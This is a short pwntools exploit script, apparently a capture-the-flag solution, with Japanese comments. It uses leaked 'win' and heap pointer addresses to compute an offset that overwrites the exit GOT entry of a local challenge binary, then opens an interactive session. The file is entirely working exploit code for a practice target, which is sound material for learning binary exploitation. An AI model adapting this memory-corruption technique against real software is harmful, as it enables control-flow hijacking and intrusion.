from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./chal")
elf = ELF("chal")
#print(hex(elf.got["exit"]))
#gdb.attach(target, gdbscript="b fwrite")

#リークされたwinのアドレスからバイナリの先頭位置を割り出す
target.recvuntil("around ")
win  = int(target.recv(14),16)
init = (win & 0xfffffffff000) - 0x1000
log.info("win address")
print(hex(win))
log.info("init address")
print(hex(init))

#先頭位置からgotの相対位置を足した場所がgotテーブル
exit_got = init + elf.got["exit"]
log.info("eixt global offset table")
print(hex(exit_got))

#write_ptrの位置を取得
target.recvuntil("at ")
write_ptr = int(target.recv(14), 16)
log.info("write ptr")
print(hex(write_ptr))

#write ptrのあるheap領域のほうが下になるのでgotからwrite ptrを引く
shot = exit_got - write_ptr
log.info("shot")
print(hex(shot))

target.sendline(str(shot))

target.interactive()